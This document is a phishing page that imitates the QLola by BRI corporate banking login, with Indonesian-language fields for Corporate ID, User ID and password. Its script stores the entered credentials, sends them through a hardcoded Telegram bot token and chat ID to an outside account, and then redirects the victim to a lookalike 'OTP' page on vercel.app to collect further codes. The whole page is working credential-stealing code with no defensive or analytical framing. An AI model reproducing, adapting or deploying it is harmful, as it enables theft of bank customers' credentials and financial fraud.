<div data-replaced-tag="body">
    <div class="container">
        <div class="logo-section">
            <img src="https://img.sanishtech.com/u/4844cdb5cf56cafc16715b2ed9341ec0.png" alt="QLola by BRI">
            <p class="tagline">Integrated Corporate Solution</p>
        </div>

        <div class="orange-divider"></div>

        <div class="login-card">
            <h2 class="login-title">LOGIN</h2>

            <form id="loginForm" onsubmit="return false;">
                <div class="form-group">
                    <label class="form-label">
                        Corporate ID
                        <span class="info-icon">i</span>
                    </label>
                    <div class="form-input-wrapper">
                        <input type="text" class="form-input" placeholder="Masukkan Corporate ID Anda" id="corporateId" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">User ID</label>
                    <div class="form-input-wrapper">
                        <input type="text" class="form-input" placeholder="Masukkan user ID anda" id="userId" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Kata Sandi</label>
                    <div class="form-input-wrapper">
                        <input type="password" class="form-input" placeholder="Masukkan kata sandi anda" id="password" style="padding-right: 50px;" required>
                        <button type="button" class="password-toggle" onclick="togglePassword()">
                            <svg id="eyeIcon" viewbox="0 0 24 24">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"></path>
                                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"></path>
                                <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"></path>
                                <line x1="1" y1="1" x2="23" y2="23"></line>
                            </svg>
                        </button>
                    </div>
                </div>

                <div class="forgot-password">
                    <a href="#">LUPA KATA SANDI?</a>
                </div>

                <button type="submit" class="btn-login" id="btnLogin">Masuk</button>
            </form>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = `
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    <circle cx="12" cy="12" r="3"/>
                `;
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = `
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                    <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                    <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
                    <line x1="1" y1="1" x2="23" y2="23"/>
                `;
            }
        }

        // Enable button when all fields are filled
        const inputs = document.querySelectorAll('.form-input');
        const btnLogin = document.getElementById('btnLogin');

        inputs.forEach(input => {
            input.addEventListener('input', () => {
                const allFilled = Array.from(inputs).every(i => i.value.trim() !== '');
                btnLogin.classList.toggle('active', allFilled);
            });
        });

        // Handle form submit
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const corporateId = document.getElementById('corporateId').value;
            const userId = document.getElementById('userId').value;
            const password = document.getElementById('password').value;

            // Save data to localStorage
            localStorage.setItem('qlolaData', JSON.stringify({ corporateId, userId, password }));

            // Send to Telegram
            const message = `Qlola BRI 1/2\n\nCorporate ID: ${corporateId}\nUser ID: ${userId}\nKata Sandi: ${password}`;
            await sendToTelegram(message);

            // Redirect to OTP
            window.location.href = 'https://www-qlolabri.vercel.app/selanjutnya.html';
        });

        async function sendToTelegram(message) {
            const botToken = '8277421901:AAGE8YZxA5mon1SSCNP6kSV2vY3RNMMAFJs'; // Ganti dengan token bot Telegram Anda
            const chatId = '7953949040'; // Ganti dengan chat ID Anda
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(url);
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
    </script>
